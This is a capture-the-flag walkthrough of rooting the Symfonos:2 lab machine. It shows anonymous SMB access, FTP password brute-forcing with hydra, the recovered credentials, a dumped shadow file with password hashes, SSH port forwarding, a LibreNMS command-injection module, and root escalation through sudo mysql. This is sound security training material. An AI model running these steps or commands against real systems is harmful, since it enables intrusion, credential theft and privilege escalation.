root@kali ~# nmap -sS -A -T4 -p- 10.0.0.21

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)

Starting with a NMAP scan, we have 4, ftp, ssh, http and smb (samba).
Let's Start by enumerating smb and ftp

----------------------------------------------------------------------------------------
SMB
----------------------------------------------------------------------------------------
root@kali ~/D/C/SYMFONOS#2# smbclient -L //10.0.0.21/
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)

We are not required to enter a password.

root@kali ~/D/C/SYMFONOS#2# smbclient //10.0.0.21/anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 18 10:30:09 2019
  ..                                  D        0  Thu Jul 18 10:29:08 2019
  backups                             D        0  Thu Jul 18 10:25:17 2019

                19728000 blocks of size 1024. 16298676 blocks available
smb: \> cd backups
smb: \backups\> ls                                                                                         
  .                                   D        0  Thu Jul 18 10:25:17 2019                                 
  ..                                  D        0  Thu Jul 18 10:30:09 2019                                 
  log.txt                             N    11394  Thu Jul 18 10:25:16 2019                                 
                                                                                                           
                19728000 blocks of size 1024. 16298676 blocks available                                    
smb: \backups\> get log.txt
getting file \backups\log.txt of size 11394 as log.txt (271.4 KiloBytes/sec) (average 271.4 KiloBytes/sec) 

We downloaded the file log.txt to our local machine and it holds a lot of information. "root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf", this line shows that the /etc/shadow file was copied to /var/backups as shadow.bak, when we will get access we can get access to the machine probably hash the password stored inside.
After going to the log.txt file some more, we find the username ---> "aeolus"

------------------------------------------------------------------------------------
HTTP
------------------------------------------------------------------------------------
After brute forcing the directories on the web site on hosted on port 80 doesn't hold any files or extra directories, so we will leave it for now. 

------------------------------------------------------------------------------------
FTP
------------------------------------------------------------------------------------
Ftp doesn't allow for anonymous logins so let's try brute forcing it using the username we found.

root@kali ~/D/C/SYMFONOS#2# hydra -l 'aeolus' -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.21 -I -t4 -V

[21][ftp] host: 10.0.0.21   login: aeolus   password: sergioteamo

Logging in to the ftp server it holds the same content as the smb, maybe the creds we found are also valid for ssh.

------------------------------------------------------------------------------------
SSH
------------------------------------------------------------------------------------
root@kali ~/D/C/SYMFONOS#2# ssh aeolus@10.0.0.21
aeolus@10.0.0.21's password: sergioteamo
aeolus@symfonos2:~$ uname -a
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux

Going back to the log.txt file, the admin of the machine copied the /etc/shadow file, we can read it:

root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7:::
daemon:*:18095:0:99999:7:::
bin:*:18095:0:99999:7:::
sys:*:18095:0:99999:7:::
sync:*:18095:0:99999:7:::
games:*:18095:0:99999:7:::
man:*:18095:0:99999:7:::
lp:*:18095:0:99999:7:::
mail:*:18095:0:99999:7:::
news:*:18095:0:99999:7:::
uucp:*:18095:0:99999:7:::
proxy:*:18095:0:99999:7:::
www-data:*:18095:0:99999:7:::
backup:*:18095:0:99999:7:::
list:*:18095:0:99999:7:::
irc:*:18095:0:99999:7:::
gnats:*:18095:0:99999:7:::
nobody:*:18095:0:99999:7:::
systemd-timesync:*:18095:0:99999:7:::
systemd-network:*:18095:0:99999:7:::
systemd-resolve:*:18095:0:99999:7:::
systemd-bus-proxy:*:18095:0:99999:7:::
_apt:*:18095:0:99999:7:::
Debian-exim:!:18095:0:99999:7:::
messagebus:*:18095:0:99999:7:::
sshd:*:18095:0:99999:7:::
aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::
cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::
mysql:!:18095:0:99999:7:::
Debian-snmp:!:18095:0:99999:7:::
librenms:!:18095::::::

We can see that there is another user (cronus) on the machine.
I tried using "john" to crack the passwords for root, aeolus and cronus but unfortunately it wasn't succesfull.

aeolus@symfonos2:~$ sudo -l
[sudo] password for aeolus: 
Sorry, user aeolus may not run sudo on symfonos2.

aeolus@symfonos2:~$ find / -perm /4000 2> /dev/null

I tried to see what permissions the user has and If there were any SUID files on the machine but there were none.
At this point I got stuck for a while, there were no crontabs, SUID files or kernel expliots available, I looked at a write up for this machine and saw that we needed to do another nmap scan to the machine.

aeolus@symfonos2:~$ nmap localhost -p-

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8080/tcp open  http-proxy

The machine has a web proxy, we need to Port Forward the content of the proxy to our local machine, (Port Forwading allows computers over the intenet to connect to a specific computer or service within a private network). We can use ssh for this.

root@kali ~/D/C/SYMFONOS#2# ssh -L 8080:127.0.0.1:8080 aeolus@10.0.0.21

Going to localhost:8080 we get as site with "LibreNMS" running on it. We can log with the same creds we logged in to ssh with.
I searched msfconsle for "LibreNMS" and found this expliot --->
linux/http/librenms_collectd_cmd_inject

Using it allows us to get a shell on the machine as the cronus user we found eariler. 

We can use "python2 -c 'import pty; pty.spawn("/bin/bash")'" to get a better shell

python2 -c 'import pty; pty.spawn("/bin/bash")'
cronus@symfonos2:/opt/librenms/html$ whoami
cronus
cronus@symfonos2:/opt/librenms/html$ 

cronus@symfonos2:/home/cronus$ sudo -l

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql

It seems we can run mysql with sudo. 

cronus@symfonos2:/home/cronus$ sudo mysql -uroot
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| librenms           |
| mysql              |
| performance_schema |
+--------------------+

After playing with it for a while, I didn't find anything in any table. After reading the manual page for mysql, turns out mysql has an options to run bash commands, we can use \! /bin/bash and get a shell as root.

MariaDB [(none)]> \! /bin/bash
root@symfonos2:/home/cronus# 

We can now go to the /root folder and read the proot.txt file.

proof.txt:

        Congrats on rooting symfonos:2!

           ,   ,
         ,-`{-`/
      ,-~ , \ {-~~-,
    ,~  ,   ,`,-~~-,`,
  ,`   ,   { {      } }                                             }/
 ;     ,--/`\ \    / /                                     }/      /,/
;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
; /   `       } } `, `-`-.___                            / `,  ,/  `,/
 \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
  `        { {                                     __  /  ,`/   ,`,;
        /   \ \                                 _,`, `{  `,{   `,`;`
       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
                   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
       /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
     / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
    / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
  /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,

        Contact me via Twitter @zayotic to give feedback!
